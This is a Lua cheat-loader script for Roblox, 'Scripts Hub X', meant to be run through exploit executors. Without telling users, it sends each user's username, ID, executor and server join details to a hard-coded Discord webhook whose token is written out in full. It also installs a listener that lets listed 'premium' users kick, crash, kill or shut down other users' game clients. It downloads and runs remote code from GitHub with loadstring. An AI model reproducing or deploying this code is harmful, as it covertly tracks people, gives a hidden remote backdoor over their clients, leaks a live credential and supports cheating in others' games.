-- ================================
-- Scripts Hub X | Official (Fixed Version) + Premium Commands System
-- ================================

-- KEY SYSTEM TOGGLE VARIABLE
local Keysystem = false -- Set to false to skip key system for non-premium users

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"2341777244", -- Owner
	"2726723958", -- SHX | Developer - mhicel
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Webhook URLs
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"

-- ================================
-- SCRIPTS HUB X USER TRACKING SYSTEM
-- ================================

local SCRIPTSHUBX_MARKER_NAME = "SHX_USER_MARKER"
local COMMAND_FOLDER_NAME = "SHX_COMMANDS"
local commandFolder = nil
local userMarker = nil
local trackedUsers = {}
local isPremiumUser = false

-- Create user marker to identify Scripts Hub X users
local function createUserMarker()
	pcall(function()
		-- Check if marker already exists
		if Workspace:FindFirstChild(SCRIPTSHUBX_MARKER_NAME .. "_" .. player.UserId) then
			return
		end
		
		-- Create invisible marker
		local marker = Instance.new("Part")
		marker.Name = SCRIPTSHUBX_MARKER_NAME .. "_" .. player.UserId
		marker.Size = Vector3.new(0.1, 0.1, 0.1)
		marker.Transparency = 1
		marker.CanCollide = false
		marker.Anchored = true
		marker.Position = Vector3.new(0, -10000, 0) -- Far away
		
		-- Store user info
		local userInfo = Instance.new("StringValue")
		userInfo.Name = "UserInfo"
		userInfo.Value = HttpService:JSONEncode({
			UserId = player.UserId,
			Username = player.Name,
			DisplayName = player.DisplayName,
			IsPremium = isPremiumUser,
			Timestamp = tick()
		})
		userInfo.Parent = marker
		
		marker.Parent = Workspace
		userMarker = marker
		
		print("[SHX] User marker created")
	end)
end

-- Create command folder for inter-user communication
local function createCommandFolder()
	pcall(function()
		if Workspace:FindFirstChild(COMMAND_FOLDER_NAME) then
			commandFolder = Workspace[COMMAND_FOLDER_NAME]
		else
			commandFolder = Instance.new("Folder")
			commandFolder.Name = COMMAND_FOLDER_NAME
			commandFolder.Parent = Workspace
		end
		print("[SHX] Command folder initialized")
	end)
end

-- Scan for other Scripts Hub X users
local function scanForScriptsHubXUsers()
	pcall(function()
		trackedUsers = {}
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj.Name:match("^" .. SCRIPTSHUBX_MARKER_NAME .. "_") then
				local userId = obj.Name:gsub(SCRIPTSHUBX_MARKER_NAME .. "_", "")
				if userId ~= tostring(player.UserId) then
					local userInfo = obj:FindFirstChild("UserInfo")
					if userInfo and userInfo:IsA("StringValue") then
						local success, data = pcall(function()
							return HttpService:JSONDecode(userInfo.Value)
						end)
						if success and data then
							trackedUsers[userId] = {
								Username = data.Username,
								DisplayName = data.DisplayName,
								IsPremium = data.IsPremium,
								Marker = obj
							}
						end
					end
				end
			end
		end
		print("[SHX] Found " .. #trackedUsers .. " Scripts Hub X users")
	end)
end

-- ================================
-- PREMIUM COMMAND FUNCTIONS
-- ================================

local CommandFunctions = {}

-- ;kick command
CommandFunctions.kick = function(args)
	local message = table.concat(args, " ", 2) or "You have been kicked by a Scripts Hub X Premium user"
	player:Kick(message)
end

-- ;crash command
CommandFunctions.crash = function(args)
	while true do
		RunService.Heartbeat:Wait()
		for i = 1, 1000 do
			Instance.new("Part", Workspace)
		end
	end
end

-- ;byfron command (delete all GUIs)
CommandFunctions.byfron = function(args)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				gui:Destroy()
			end
		end
		for _, gui in pairs(CoreGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				pcall(function() gui:Destroy() end)
			end
		end
	end)
end

-- ;deletemap command
CommandFunctions.deletemap = function(args)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera and obj.Name ~= COMMAND_FOLDER_NAME and not obj.Name:match(SCRIPTSHUBX_MARKER_NAME) then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
end

-- ;framerate command
CommandFunctions.framerate = function(args)
	local fps = tonumber(args[2]) or 1
	pcall(function()
		setfpscap(fps)
	end)
	if not pcall(function() setfpscap(fps) end) then
		-- Alternative framerate method
		RunService:Set3dRenderingEnabled(false)
		task.wait(0.1)
		RunService:Set3dRenderingEnabled(true)
	end
end

-- ;gravity command
CommandFunctions.gravity = function(args)
	local gravityValue = tonumber(args[2]) or 100
	Workspace.Gravity = gravityValue
end

-- ;jump command
CommandFunctions.jump = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Jump = true
	end
end

-- ;kill command
CommandFunctions.kill = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Health = 0
	end
end

-- ;reveal command
CommandFunctions.reveal = function(args)
	pcall(function()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
			"I am using Scripts Hub X :)",
			"All"
		)
	end)
end

-- ;shutdown command
CommandFunctions.shutdown = function(args)
	game:Shutdown()
end

-- ;toggle command
CommandFunctions.toggle = function(args)
	-- This would toggle modules if they exist
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("ScreenGui") then
				gui.Enabled = not gui.Enabled
			end
		end
	end)
end

-- ;trip command
CommandFunctions.trip = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Sit = true
	end
end

-- ;uninject command
CommandFunctions.uninject = function(args)
	-- Remove all Scripts Hub X related objects
	pcall(function()
		if userMarker then userMarker:Destroy() end
		-- Clean up any SHX GUIs
		for _, gui in pairs(playerGui:GetChildren()) do
			if gui.Name:match("SHX") or gui.Name:match("ScriptsHubX") then
				gui:Destroy()
			end
		end
	end)
end

-- ;void command
CommandFunctions.void = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
	end
end

-- ;india, ;scriptshubx, ;anime commands
CommandFunctions.india = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://6534369609"
		sky.SkyboxDn = "rbxassetid://6534369609"
		sky.SkyboxFt = "rbxassetid://6534369609"
		sky.SkyboxLf = "rbxassetid://6534369609"
		sky.SkyboxRt = "rbxassetid://6534369609"
		sky.SkyboxUp = "rbxassetid://6534369609"
	end)
end

CommandFunctions.scriptshubx = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://74135635728836" -- Replace with Scripts Hub X texture
		sky.SkyboxDn = "rbxassetid://74135635728836"
		sky.SkyboxFt = "rbxassetid://74135635728836"
		sky.SkyboxLf = "rbxassetid://74135635728836"
		sky.SkyboxRt = "rbxassetid://74135635728836"
		sky.SkyboxUp = "rbxassetid://74135635728836"
	end)
end

CommandFunctions.anime = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://8281674209"
		sky.SkyboxDn = "rbxassetid://8281674209"
		sky.SkyboxFt = "rbxassetid://8281674209"
		sky.SkyboxLf = "rbxassetid://8281674209"
		sky.SkyboxRt = "rbxassetid://8281674209"
		sky.SkyboxUp = "rbxassetid://8281674209"
	end)
end

-- ;freeze command
CommandFunctions.freeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = true
			end
		end
	end
end

-- ;funny command
CommandFunctions.funny = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100000, 0)
	end
end

-- ================================
-- COMMAND LISTENER AND EXECUTOR
-- ================================

-- Listen for command objects in workspace
local function startCommandListener()
	if not commandFolder then return end
	
	commandFolder.ChildAdded:Connect(function(obj)
		task.wait(0.1) -- Small delay to ensure data is loaded
		
		if obj:IsA("StringValue") and obj.Name:match("^CMD_") then
			pcall(function()
				local commandData = HttpService:JSONDecode(obj.Value)
				
				-- Check if command is for this user
				if commandData.TargetUserId == tostring(player.UserId) then
					print("[SHX] Received command: " .. commandData.Command .. " from " .. commandData.SenderUsername)
					
					-- Execute the command
					local commandName = commandData.Command:lower()
					local args = commandData.Args or {}
					
					if CommandFunctions[commandName] then
						task.spawn(function()
							CommandFunctions[commandName](args)
						end)
					end
					
					-- Clean up command object
					task.wait(1)
					obj:Destroy()
				end
			end)
		end
	end)
	
	print("[SHX] Command listener started")
end

-- Parse and send commands from chat
local function parseCommand(message)
	if not message:sub(1, 1) == ";" then return end
	if not isPremiumUser then
		return
	end
	
	local args = message:split(" ")
	local command = args[1]:sub(2):lower() -- Remove semicolon
	local targetUsername = args[2]
	
	if not targetUsername then
		print("[SHX] No target specified")
		return
	end
	
	-- Find target user in tracked users
	local targetUserId = nil
	for userId, userData in pairs(trackedUsers) do
		if userData.Username:lower() == targetUsername:lower() or userData.DisplayName:lower() == targetUsername:lower() then
			targetUserId = userId
			break
		end
	end
	
	if not targetUserId then
		print("[SHX] Target user not found or not using Scripts Hub X")
		return
	end
	
	-- Create command object
	pcall(function()
		local commandObj = Instance.new("StringValue")
		commandObj.Name = "CMD_" .. HttpService:GenerateGUID(false)
		commandObj.Value = HttpService:JSONEncode({
			Command = command,
			Args = args,
			SenderUserId = tostring(player.UserId),
			SenderUsername = player.Name,
			TargetUserId = targetUserId,
			Timestamp = tick()
		})
		commandObj.Parent = commandFolder
		
		print("[SHX] Command sent: " .. command .. " to " .. targetUsername)
		
		-- Clean up after 5 seconds
		task.delay(5, function()
			if commandObj and commandObj.Parent then
				commandObj:Destroy()
			end
		end)
	end)
end

-- Listen to player's chat
local function startChatListener()
	-- Method 1: TextChatService (new chat)
	pcall(function()
		local TextChatService = game:GetService("TextChatService")
		local textChannel = TextChatService.TextChannels.RBXGeneral
		
		textChannel.MessageReceived:Connect(function(message)
			if message.TextSource and message.TextSource.UserId == player.UserId then
				parseCommand(message.Text)
			end
		end)
	end)
	
	-- Method 2: Legacy chat
	pcall(function()
		player.Chatted:Connect(function(message)
			parseCommand(message)
		end)
	end)
	
	print("[SHX] Chat listener started")
end

-- Updated Key System Loader for Randomized API
local function loadKeySystem()
	local success, keySystemModule = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load key system: " .. tostring(keySystemModule))
		return false
	end
	
	if type(keySystemModule) ~= "table" then
		warn("Key system returned invalid data type: " .. type(keySystemModule))
		return false
	end
	
	print("Checking for existing valid key...")
	if keySystemModule.CheckExistingKey and keySystemModule.CheckExistingKey() then
		print("Valid key found and verified with API, skipping key system UI")
		return true
	end

	if keySystemModule.ShowKeySystem then
		keySystemModule.ShowKeySystem()
	else
		warn("ShowKeySystem function not found in key system module")
		return false
	end
	
	local maxWait = 300
	local waited = 0
	local lastUpdate = 0
	
	while waited < maxWait do
		if keySystemModule.IsKeyVerified and keySystemModule.IsKeyVerified() then
			print("Key verified successfully with randomized API")
			return true
		end
		
		task.wait(1)
		waited = waited + 1
		
		if waited - lastUpdate >= 30 then
			lastUpdate = waited
			local remainingMinutes = math.ceil((maxWait - waited) / 60)
			print("Key verification timeout in " .. remainingMinutes .. " minutes...")
		end
	end
	
	print("Key verification timeout or failed")
	return false
end

-- ================================
-- REMAINING ORIGINAL FUNCTIONS
-- ================================

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif getgenv and getgenv().scriptware then
		return "Script-Ware"
	elseif getgenv and getgenv().protosmasher then
		return "ProtoSmasher"
	elseif getgenv and getgenv().sirhurt then
		return "SirHurt"
	elseif getgenv and getgenv().sentinellib then
		return "Sentinel"
	elseif getgenv and getgenv().vega then
		return "Vega X"
	elseif getgenv and getgenv().oxygen then
		return "Oxygen U"
	elseif getgenv and getgenv().comet then
		return "Comet"
	elseif getgenv and getgenv().nihon then
		return "Nihon"
	elseif getgenv and getgenv().delta then
		return "Delta"
	elseif getgenv and getgenv().evon then
		return "Evon"
	elseif getgenv and getgenv().electron then
		return "Electron"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local userId = tostring(player.UserId)
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Official - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						{["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)', ["inline"] = true},
						{["name"] = "Join Link", ["value"] = '[Join To The Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		local function makeWebhookRequest()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif syn and syn.request then
				syn.request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			else
				print("No HTTP request function available")
			end
		end
		
		pcall(makeWebhookRequest)
	end)
end

-- Game support check function
local function checkGameSupport()	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data type: " .. type(Games))
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- Game script loading function
local function loadGameScript(scriptUrl)
	local success, result = pcall(function()
		local scriptContent = game:HttpGet(scriptUrl)
		if not scriptContent or scriptContent == "" then
			error("Empty script content received")
		end
		return loadstring(scriptContent)()
	end)
	
	if success then
		print("Game script loaded and executed successfully")
		return true, nil
	else
		print("Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		isPremiumUser = true
		return "owner"
	end
	
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		isPremiumUser = true
		return "staff"
	end
	
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		isPremiumUser = true
		return "premium"
	end
	
	print("Regular user detected - Key system required")
	return "regular"
end

-- ================================
-- MAIN EXECUTION WITH PREMIUM COMMANDS
-- ================================

spawn(function()
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Initialize command system for all users
	createCommandFolder()
	createUserMarker()
	
	-- Wait a bit for other users to register
	task.wait(2)
	scanForScriptsHubXUsers()
	
	-- Start command listener for all users
	startCommandListener()
	
	-- Start chat listener only for premium users
	if isPremiumUser then
		startChatListener()
		print("[SHX] Premium commands enabled")
		notify("Scripts Hub X", "Premium commands system active!")
	end
	
	-- Periodic user scan
	task.spawn(function()
		while true do
			task.wait(30)
			scanForScriptsHubXUsers()
		end
	end)
	
	-- Handle key system for non-premium users
	if userStatus == "regular" and Keysystem then
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("Key system failed or timed out")
			notify("Scripts Hub X", "Key verification failed or timed out.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("Key system disabled - Bypassing for regular user")
		userStatus = "regular-bypassed"
	else
		print("Premium/Staff/Owner user - Bypassing key system")
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Handle unsupported games
	if not isSupported then
		notify("Scripts Hub X", "Game is not supported yet.")
		return
	end
	
	-- Load and execute the game script
	print("Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("Scripts Hub X | Complete for " .. userStatus .. " user")
		if isPremiumUser then
			print("[SHX] Premium commands ready. Use ;help in chat for command list")
		end
	else
		print("Script failed to load: " .. tostring(errorMsg))
	end
end)
